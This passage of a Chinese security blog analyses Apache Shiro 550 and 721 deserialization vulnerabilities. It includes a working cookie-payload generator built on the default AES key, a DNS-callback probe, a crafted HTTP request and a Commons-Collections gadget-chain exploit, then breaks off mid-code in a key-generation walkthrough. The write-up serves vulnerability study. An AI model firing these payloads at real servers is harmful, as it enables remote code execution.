+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remeberMe</span>(<span class="params">command, ysoserial_path</span>):</span><br><span class="line">    <span class="comment">#popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, ysoserial_path, &#x27;URLDNS&#x27;, command], stdout=subprocess.PIPE)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(command) &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    arr = [<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, ysoserial_path] + command</span><br><span class="line">    <span class="comment"># print(arr)</span></span><br><span class="line">    popen = subprocess.Popen(arr, stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = optparse.OptionParser(usage = <span class="string">&#x27;python3 %prog [-h] [-p path-ysoserial] [-m method] [-c command]&#x27;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--path-ysoserial&#x27;</span>, dest=<span class="string">&#x27;path&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;path ysoserial&#x27;</span>, default=<span class="string">&#x27;ysoserial.jar&#x27;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, dest=<span class="string">&#x27;command&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--method&#x27;</span>, dest=<span class="string">&#x27;method&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;ysoserial method&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    options, args = parse.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> options.command <span class="keyword">or</span> <span class="keyword">not</span> options.method:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:python3 generate_remeberMe.py [-c command] [-m method]\n&#x27;</span>)</span><br><span class="line">        exit(<span class="string">&#x27;generate_remeberMe.py:error:missing a mandatory option(-c,-m).Use -h for basic and -hh for advanced help&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    args_list = [options.method, options.command]</span><br><span class="line">    <span class="built_in">print</span>(args_list)</span><br><span class="line">    payload = remeberMe(args_list, options.path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 generate_remeberMe.py -p ../ysoserial-all.jar -m URLDNS -c http://q3kbhojx.eyes.sh </span><br></pre></td></tr></table></figure>
+
+<p>生成的cookie值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=zCmIVaHZRWaEDgG4ai9KtSyUBRDy64H02wKgeXOeABaFiUbjOXTdpaqi42ete4k8xF0C1u0HpWFOccMjPvGMmzgu7/wSbi4tYDGSanE+aVQU9VYD/L2mdOQyqYliPNelAmbnTNl8tVnQEA9wAbVDrvdJOObIeLNiHweoY6d7iOOXBym5GTjFrvI/<span class="number">5</span>+/bZ6PABVkVySJsjEOzs7cJdYI6JVyqnEVFwoZnWNDAj9oSwOkxsmKQ5zyV8WZQOD8ywANAotwPYrOGG21E9/50FJbOBCGhwxr4sCyrn2Y1GrG4DdZ37ykK+ebAJd7gQEMdlvbegYGn2v2fTGbwgpGEHC41q2Km1r62PRR3wJ99sp85yrX1unQdMVW0K+KAXvTEaIjRkVflhpgmA0v2A9L+G2rRfg==</span><br></pre></td></tr></table></figure>
+
+<p>发送包进行请求</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /samples_web_war/ HTTP/1.1</span><br><span class="line">Host: 192.168.3.136:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=2B290CC9ACB7DC118345F067BAB9693C; rememberMe=zCmIVaHZRWaEDgG4ai9KtSyUBRDy64H02wKgeXOeABaFiUbjOXTdpaqi42ete4k8xF0C1u0HpWFOccMjPvGMmzgu7/wSbi4tYDGSanE+aVQU9VYD/L2mdOQyqYliPNelAmbnTNl8tVnQEA9wAbVDrvdJOObIeLNiHweoY6d7iOOXBym5GTjFrvI/5+/bZ6PABVkVySJsjEOzs7cJdYI6JVyqnEVFwoZnWNDAj9oSwOkxsmKQ5zyV8WZQOD8ywANAotwPYrOGG21E9/50FJbOBCGhwxr4sCyrn2Y1GrG4DdZ37ykK+ebAJd7gQEMdlvbegYGn2v2fTGbwgpGEHC41q2Km1r62PRR3wJ99sp85yrX1unQdMVW0K+KAXvTEaIjRkVflhpgmA0v2A9L+G2rRfg==</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>最后会在DNS平台上出现请求记录<br>发送包后代码的具体执行如上述cookie解密过程一致，先对设置的payload进行base64解密，然后再对其进行AES解密，最后将得到的字节码进行反序列化操作，调用readObject函数，触发URLDNS链</p>
+<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><h3 id="关于resolveClass"><a href="#关于resolveClass" class="headerlink" title="关于resolveClass"></a>关于resolveClass</h3><p>再使用ObjectInputStream类的readObject函数进行反序列化的过程中，其中会进行resolveClass方法来查找类；在ObjectInputStream类的resolveClass方法中通过Class.forName来获取当前描述器所指代的类的Class对象，但是Shiro中重写了ObjectInputStream类的resolveClass方法，它采用的是ClassUtils.forName来查找<br>查看ClassResolvingObjectInputStream类的resolveClass函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入ClassUtils.forName函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn +</span><br><span class="line">                    <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> +</span><br><span class="line">                <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownClassException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里接受的参数类型是String类型，如果传入的是Transform数组，会报错，具体的细节在THREAD_CL_ACCESSOR.loadClass中</p>
+<p>这里引入commons-collections:4.0，CC2链使用的是非数组形式，所以可以利用成功</p>
+<p>与此同时，Shiro中自带的CommonsBeanutils组件也可使用对应的CB链去利用</p>
+<h3 id="利用CC链"><a href="#利用CC链" class="headerlink" title="利用CC链"></a>利用CC链</h3><p>commons collections:3.2.1</p>
+<p>参考wh1t3p1g文章，exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);<span class="comment">// 构造带有evil class bytes的TemplatesImpl</span></span><br><span class="line"><span class="comment">// 构造InvokerTransformer，填充无害的toString函数</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 构造LazyMap的factory为前面的InvokerTransformer</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"><span class="comment">// 填充TiedMapEntry的map（lazyMap）和key（TemplatesImpl）</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="comment">// 下述代码将entry填充到HashSet的node的key上，可以使得HashSet在put的时候调用TiedMapEntry的hashCode函数</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f2);</span><br><span class="line">Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(keyField);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"><span class="comment">// 将最终的触发函数newTransformer装载到InvokerTransformer上</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在Shiro1.2.5中，将默认的key改成了动态key，但还是存在反序列化问题</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14183173.html">Java安全之Shiro 550反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13894507.html">Java安全之安全加密算法 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/139">Java反序列化漏洞——Shiro550 - 枫のBlog (goodapple.top)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/15542615.html">Apache Shiro 反序列化漏洞分析 - Zh1z3ven - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://xilitter.github.io/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html">shiro反序列化初探 | XiLitter</a><br><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Shiro 反序列化漏洞原理分析 - Geekby’s Blog</a></p>
+<h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><p>编号：CVE-2019-12422<br>影响版本：Apache Shiro &lt;&#x3D; 1.4.1<br>流程：</p>
+<ol>
+<li>登录网站获取正确的Cookie值（remeberMe）</li>
+<li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li>
+<li>利用intermediary构造出恶意的反序列化密文作为Cookie</li>
+<li>使用新的Cookie请求网站执行攻击</li>
+</ol>
+<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>版本下载地址：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1">https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1</a><br>导入IDEA，加载包，启动Tomact，直接运行即可</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>在Shiro550中，密钥直接写在源码中，而在Shiro721中，密钥动态生成<br>查看</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">    setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看generateNewKey方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Key <span class="title function_">generateNewKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> generateNewKey(getKeySize());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中这里的getKeySize是获取key的长度<br>再进入到重载的generateNewKey方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Key <span class="title function_">generateNewKey</span><span class="params">(<span class="type">int</span> keyBitSize)</span> &#123;</span><br><span class="line">    KeyGenerator kg;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 根据算法名字初始化一个密钥生成器对象</span></span><br><span class="line">        kg = KeyGenerator.getInstance(getAlgorithmName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to acquire &quot;</span> + getAlgorithmName() + <span class="string">&quot; algorithm.  This is required to function.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    kg.init(keyBitSize);</span><br><span class="line">    <span class="keyword">return</span> kg.generateKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903142908.png"><br>进入init方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.init(var1, JceSecurity.RANDOM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的var1指的是key的长度，即128，调用重载方法init</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> var1, SecureRandom var2)</span> &#123;</span><br><span class="line">    <span class="comment">// var1表示key的大小</span></span><br><span class="line">    <span class="comment">// var2表示用于生成随机数的安全随机数生成器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.serviceIterator == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.spi.engineInit(var1, var2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果&quot;serviceIterator&quot;不为null，表示有多个服务提供者实现可用。在这种情况下，会进入一个循环，不断尝试调用不同的服务提供者实现来初始化密钥生成器</span></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">KeyGeneratorSpi</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.spi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 初始化密钥生成器</span></span><br><span class="line">                var4.engineInit(var1, var2);</span><br><span class="line">                <span class="built_in">this</span>.initType = <span class="number">4</span>;</span><br><span class="line">                <span class="built_in">this</span>.initKeySize = var1;</span><br><span class="line">                <span class="built_in">this</span>.initParams = <span class="literal">null</span>;</span><br><span class="line">                <span class="built_in">this</span>.initRandom = var2;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var6) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var3 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    var3 = var6;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 取下一个可用的服务提供者实现</span></span><br><span class="line">                var4 = <span class="built_in">this</span>.nextSpi(var4, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (var4 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var3;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法主要是用于获取初始化密钥生成器<br>回到generateNewKey方法，初始化完成后，调用generateKey方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> SecretKey <span class="title function_">generateKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.serviceIterator == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.spi.engineGenerateKey();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">KeyGeneratorSpi</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.spi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> 